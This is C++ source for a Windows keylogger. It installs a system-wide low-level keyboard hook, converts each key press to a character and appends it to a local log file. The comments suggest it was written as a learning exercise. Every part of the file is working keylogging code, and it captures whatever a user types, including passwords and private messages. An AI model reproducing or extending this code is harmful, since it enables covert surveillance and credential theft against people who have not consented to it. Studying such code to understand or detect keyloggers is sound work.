#include <windows.h>
#include <iostream>
#include <fstream>

#pragma comment(lib, "User32.lib")

std::ofstream kblog("kb_log.txt", std::ios::app);

char vk2ascii(UINT vkCode) {
    BYTE keyboardState[256];
    for (int i = 0; i < 256; i++) {
        keyboardState[i] = (BYTE)GetKeyState(i);
    }

    WCHAR buffer[4] = {};

    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);

    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 4, 0);

    if (result > 0) return static_cast<char>(buffer[0]);

    return '\0';
}

// lresult - type representing result of processing msg or hook notif
LRESULT CALLBACK KBHook(int code, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *pKeyStruct = (KBDLLHOOKSTRUCT *)lParam;

    if (code == HC_ACTION) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            DWORD vkCode = pKeyStruct->vkCode; // extract virtual key code
            kblog << vk2ascii(vkCode) << std::endl;
        } 
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main(int argc, char* argv[]) {

    HHOOK hKeyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,         // Hook type
        KBHook,                 // Pointer to callback func
        GetModuleHandle(NULL),  // this program
        0                       // monitor all threads
    );

    MSG msg;
    // Any msg thats not WM_QUIT, GetMessage returns non-zero val
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg); 
        DispatchMessage(&msg); // takes msg and delivers to callback function
    }

    kblog.close();
    UnhookWindowsHookEx(hKeyboardHook);

    return 0;
}